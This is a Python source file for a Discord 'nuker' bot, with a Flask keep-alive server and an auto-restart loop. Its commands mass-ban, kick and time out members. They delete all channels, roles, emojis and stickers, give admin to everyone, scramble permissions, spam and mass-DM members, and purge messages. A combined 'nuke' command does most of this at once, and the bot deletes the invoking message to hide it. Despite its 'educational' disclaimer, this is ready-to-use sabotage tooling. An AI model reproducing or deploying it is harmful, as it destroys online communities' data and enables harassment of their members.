# Disclaimer: This is only for entertainment and educational purposes.
import discord
from discord.ext import commands
import asyncio
import aiohttp
import io
from datetime import datetime, timedelta
import random
import json
import sys
import traceback
import time
import os
import threading
from flask import Flask
from config import Config

config = Config()

# Check if token is set
if not config.TOKEN:
    print("❌ Error: DISCORD_TOKEN environment variable is not set!")
    print("Please set your bot token in Render environment variables.")
    sys.exit(1)

# Create Flask app for health checks
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Discord Bot is running!"

@app.route('/health')
def health():
    return "OK", 200

def run_web_server():
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# Start web server in background thread
web_thread = threading.Thread(target=run_web_server, daemon=True)
web_thread.start()
print(f"🌐 Web server started on port {os.environ.get('PORT', 10000)}")

# Set up bot with proper intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=config.PREFIX, intents=intents)
bot.remove_command("help")

def is_whitelisted(ctx):
    if not config.WHITELIST:
        return True
    return ctx.author.id in config.WHITELIST

async def download_image(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    return await response.read()
                return None
    except Exception as e:
        print(f"Error downloading image: {e}")
        return None

@bot.event
async def on_ready():
    print(f'✅ Logged in as {bot.user} (ID: {bot.user.id})')
    print(f'✅ Bot is ready to use!')
    print(f'✅ Prefix: {config.PREFIX}')
    print(f'✅ Whitelist: {config.WHITELIST if config.WHITELIST else "Anyone can use"}')
    print('-' * 50)

@bot.event
async def on_command(ctx):
    if is_whitelisted(ctx):
        await asyncio.sleep(0.1)
        try:
            await ctx.message.delete()
        except:
            pass

@bot.check
async def globally_check_dm(ctx):
    return ctx.guild is not None

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    print(f"Error in command {ctx.command}: {error}")
    traceback.print_exc()

@bot.command()
async def rserver(ctx):
    if not is_whitelisted(ctx): return
    await ctx.guild.edit(name=config.SERVER_NAME)

@bot.command()
async def rservericon(ctx):
    if not is_whitelisted(ctx): return
    icon_image = await download_image(config.SERVER_ICON_URL)
    if icon_image:
        await ctx.guild.edit(icon=icon_image)

@bot.command()
async def cchannels(ctx, count: int = config.CHANNELS_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 50))
    for i in range(count):
        try:
            await ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}")
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def cvoice(ctx, count: int = config.VOICE_CHANNELS_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 50))
    for i in range(count):
        try:
            await ctx.guild.create_voice_channel(f"{config.VOICE_CHANNEL_NAME}")
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def ccategory(ctx, count: int = config.CATEGORIES_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 10))
    for i in range(count):
        try:
            await ctx.guild.create_category_channel(f"{config.CATEGORY_NAME}")
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def cthread(ctx, count: int = config.THREAD_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 10))
    for channel in ctx.guild.text_channels:
        for i in range(count):
            try:
                await channel.create_thread(name=f"{config.THREAD_NAME}", auto_archive_duration=60)
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def cnsfw(ctx, count: int = config.CHANNELS_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 50))
    for i in range(count):
        try:
            channel = await ctx.guild.create_text_channel(f"{config.NSFW_CHANNEL_NAME}")
            await channel.edit(nsfw=True)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def dchannels(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.01)
        except:
            pass
    try:
        await ctx.guild.create_text_channel(config.CHANNEL_NAME)
    except:
        pass

@bot.command()
async def dcategory(ctx):
    if not is_whitelisted(ctx): return
    for category in ctx.guild.categories:
        try:
            await category.delete()
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def rchannels(ctx):
    if not is_whitelisted(ctx): return
    for i, channel in enumerate(ctx.guild.channels):
        try:
            await channel.edit(name=f"{config.NEW_CHANNEL_NAME}")
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def nsfwall(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            await channel.edit(nsfw=True)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def rtopics(ctx):
    if not is_whitelisted(ctx): return
    topics = ["Nuked", "Destroyed", "Anarchy", "Chaos", "RIP"]
    for channel in ctx.guild.text_channels:
        try:
            await channel.edit(topic=random.choice(topics))
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def slowmodeall(ctx, seconds: int = config.SLOWMODE_DURATION):
    if not is_whitelisted(ctx): return
    seconds = max(0, min(seconds, 21600))
    for channel in ctx.guild.text_channels:
        try:
            await channel.edit(slowmode_delay=seconds)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def croles(ctx, count: int = config.ROLES_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 50))
    for i in range(count):
        try:
            await ctx.guild.create_role(name=f"{config.ROLE_NAME}")
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def droles(ctx):
    if not is_whitelisted(ctx): return
    for role in ctx.guild.roles:
        if role.name != "@everyone" and not role.managed:
            try:
                await role.delete()
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def rroles(ctx):
    if not is_whitelisted(ctx): return
    i = 0
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.edit(name=f"{config.NEW_ROLE_NAME}")
                i += 1
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def adminall(ctx):
    if not is_whitelisted(ctx): return
    try:
        admin_role = await ctx.guild.create_role(name=config.ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
        for member in ctx.guild.members:
            try:
                await member.add_roles(admin_role)
                await asyncio.sleep(0.01)
            except:
                pass
    except:
        pass

@bot.command()
async def rnickall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        try:
            await member.edit(nick=config.NICKNAME)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def demoteall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        try:
            roles_to_remove = [role for role in member.roles if role.name != "@everyone"]
            if roles_to_remove:
                await member.remove_roles(*roles_to_remove)
                await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def moveall(ctx):
    if not is_whitelisted(ctx): return
    try:
        vc = await ctx.guild.create_voice_channel(config.MOVE_VOICE_CHANNEL_NAME)
        for member in ctx.guild.members:
            if member.voice:
                try:
                    await member.move_to(vc)
                    await asyncio.sleep(0.01)
                except:
                    pass
    except:
        pass

@bot.command()
async def disconnectall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member.voice:
            try:
                await member.move_to(None)
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def banall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.ban()
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def unbanall(ctx):
    if not is_whitelisted(ctx): return
    async for entry in ctx.guild.bans():
        try:
            await ctx.guild.unban(entry.user)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def kickall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.kick()
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def timeoutall(ctx):
    if not is_whitelisted(ctx): return
    duration = min(config.TIMEOUT_DURATION, 28)
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.timeout(timedelta(days=duration))
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def untimeoutall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        try:
            await member.timeout(None)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def spam(ctx, count: int = config.SPAM_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 50))
    for _ in range(count):
        try:
            await ctx.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def mspam(ctx, count: int = config.SPAM_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 20))
    for channel in ctx.guild.text_channels:
        for _ in range(count):
            try:
                await channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def purge(ctx):
    if not is_whitelisted(ctx): return
    try:
        await ctx.channel.purge(limit=None)
    except:
        pass

@bot.command()
async def mpurge(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            await channel.purge(limit=None)
            await asyncio.sleep(1)
        except:
            pass

@bot.command()
async def rpins(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            pins = await channel.pins()
            for message in pins:
                try:
                    await message.unpin()
                    await asyncio.sleep(0.01)
                except:
                    pass
        except:
            pass

@bot.command()
async def cwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 10))
    for i in range(count):
        try:
            await ctx.channel.create_webhook(name=f"{config.WEBHOOK_NAME}")
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def mwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 5))
    for channel in ctx.guild.text_channels:
        for i in range(count):
            try:
                await channel.create_webhook(name=f"{config.WEBHOOK_NAME}")
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def dwebhooks(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                try:
                    await webhook.delete()
                    await asyncio.sleep(0.01)
                except:
                    pass
        except:
            pass

@bot.command()
async def rwebhooks(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            webhooks = await channel.webhooks()
            for i, webhook in enumerate(webhooks):
                try:
                    await webhook.edit(name=f"{config.WEBHOOK_RENAME}")
                    await asyncio.sleep(0.01)
                except:
                    pass
        except:
            pass

@bot.command()
async def cinvites(ctx, count: int = config.INVITE_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 10))
    for channel in ctx.guild.text_channels:
        for _ in range(count):
            try:
                await channel.create_invite()
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def dinvites(ctx):
    if not is_whitelisted(ctx): return
    invites = await ctx.guild.invites()
    for invite in invites:
        try:
            await invite.delete()
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def demojis(ctx):
    if not is_whitelisted(ctx): return
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def dstickers(ctx):
    if not is_whitelisted(ctx): return
    for sticker in ctx.guild.stickers:
        try:
            await sticker.delete()
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def dmall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != bot.user:
            try:
                await member.send(config.DM_MESSAGE)
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def chaoschannels(ctx):
    if not is_whitelisted(ctx): return
    channels = list(ctx.guild.channels)
    random.shuffle(channels)
    for position, channel in enumerate(channels):
        try:
            await channel.edit(position=position)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def chaosroles(ctx):
    if not is_whitelisted(ctx): return
    roles = [role for role in ctx.guild.roles if role.name != "@everyone"]
    random.shuffle(roles)
    for position, role in enumerate(roles, start=1):
        try:
            await role.edit(position=position)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def chaoschannelperms(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.channels:
        for role in ctx.guild.roles:
            try:
                perms = discord.PermissionOverwrite()
                perms.send_messages = random.choice(config.CHAOS_PERMISSIONS)
                perms.view_channel = random.choice(config.CHAOS_PERMISSIONS)
                perms.manage_messages = random.choice(config.CHAOS_PERMISSIONS)
                await channel.set_permissions(role, overwrite=perms)
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def chaosroleperms(ctx):
    if not is_whitelisted(ctx): return
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                perms = discord.Permissions()
                perms.value = random.randint(0, 2147483647)
                await role.edit(permissions=perms)
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def lockdown(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def unlockall(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=None)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def nuke(ctx):
    if not is_whitelisted(ctx): return
    
    guild = ctx.guild
    
    tasks = []
    tasks.append(guild.edit(name=config.SERVER_NAME))

    if config.SERVER_ICON_URL:
        icon_image = await download_image(config.SERVER_ICON_URL)
        if icon_image:
            tasks.append(guild.edit(icon=icon_image))

    tasks.extend(channel.delete() for channel in guild.channels)
    tasks.extend(role.delete() for role in guild.roles if role.name != "@everyone" and not role.managed)
    tasks.extend(sticker.delete() for sticker in guild.stickers)
    tasks.extend(emoji.delete() for emoji in guild.emojis)
    tasks.append(guild.create_text_channel(config.CHANNEL_NAME))
    
    for i in range(config.CHANNELS_COUNT):
        tasks.append(guild.create_text_channel(f"{config.CHANNEL_NAME}"))
    
    for i in range(config.ROLES_COUNT):
        tasks.append(guild.create_role(name=f"{config.ROLE_NAME}"))
    
    for member in guild.members:
        if member == bot.user: continue
        if config.NICKNAME:
            tasks.append(member.edit(nick=config.NICKNAME))
        if config.DM_MESSAGE:
            tasks.append(member.send(config.DM_MESSAGE))
        if config.TIMEOUT_DURATION:
            from datetime import timedelta
            tasks.append(member.timeout(timedelta(days=config.TIMEOUT_DURATION)))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    
    for channel in guild.text_channels:
        for _ in range(config.SPAM_COUNT):
            tasks.append(channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH))
    
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def whitelist(ctx):
    if not is_whitelisted(ctx): return
    message = "Whitelisted Users:\n" + "\n".join(str(user_id) for user_id in config.WHITELIST)
    try:
        await ctx.author.send(message)
    except:
        pass

@bot.command()
async def kill(ctx):
    if not is_whitelisted(ctx): return
    await bot.close()

@bot.command(name='help')
async def help(ctx):
    embed = discord.Embed(
        title="🖥️ Commands",
        description="List of available bot commands.",
        color=discord.Color.purple(),
        timestamp=datetime.now()
    )

    categories = {
        "🔨 Moderation": [
            "`banall`",
            "`unbanall`",
            "`kickall`",
            "`timeoutall`",
            "`untimeoutall`",
            "`rnickall`",
        ],
        "📁 Channels": [
            "`ccategory`",
            "`cchannels`",
            "`chaoschannels`",
            "`chaoschannelperms`",
            "`dcategory`",
            "`dchannels`",
            "`rchannels`",
            "`cthread`",
            "`cvoice`",
            "`slowmodeall`",
            "`lockdown`",
            "`unlockall`",
            "`moveall`",
            "`disconnectall`",
            "`rtopics`",
        ],
        "🎭 Roles": [
            "`adminall`",
            "`croles`",
            "`chaosroles`",
            "`chaosroleperms`",
            "`droles`",
            "`rroles`",
            "`demoteall`",
        ],
        "🔗 Invites / Webhooks": [
            "`cinvites`",
            "`dinvites`",
            "`cwebhooks`",
            "`dwebhooks`",
            "`mwebhooks`",
            "`rwebhooks`",
        ],
        "🖼️ Server": [
            "`rserver`",
            "`rservericon`",
            "`rpins`",
            "`cnsfw`",
            "`nsfwall`",
            "`demojis`",
            "`dstickers`",
        ],
        "💬 Messages": [
            "`purge`",
            "`mpurge`",
            "`mspam`",
            "`spam`",
            "`dmall`",
        ],
        "💥 Destructive": [
            "`nuke`",
        ],
        "🧩 Bot": [
            "`kill`",
            "`whitelist`",
        ],
        "\u200b": [
            "-# Thanks to [Vexi](<https://discord.com/users/1421939463164133590>), this product is brought to you for free! 🎀"
        ]
    }

    for category, commands in categories.items():
        embed.add_field(
            name=category,
            value="\n".join(commands),
            inline=False
        )

    await ctx.send(embed=embed)

# Run the bot
if __name__ == "__main__":
    import time
    import sys
    
    def run_bot():
        try:
            bot.run(config.TOKEN)
        except discord.HTTPException as e:
            if e.status == 429:  # Rate limited
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 60
                print(f"⚠️ Rate limited! Waiting {retry_after} seconds...")
                time.sleep(retry_after)
                return True  # Retry
            else:
                print(f"❌ HTTP Error: {e}")
                return False
        except discord.LoginFailure:
            print("❌ Error: Invalid Discord token!")
            print("Please check your DISCORD_TOKEN environment variable.")
            return False
        except Exception as e:
            print(f"❌ Error: {e}")
            traceback.print_exc()
            return False
        return True  # Success
    
    # Keep trying forever
    while True:
        print("🔄 Starting bot...")
        success = run_bot()
        
        if success:
            # If bot ran successfully but stopped, wait and restart
            print("🔄 Bot stopped, restarting in 10 seconds...")
            time.sleep(10)
        else:
            # If there was an error, wait longer before retry
            print("⏳ Waiting 30 seconds before retry...")
            time.sleep(30)
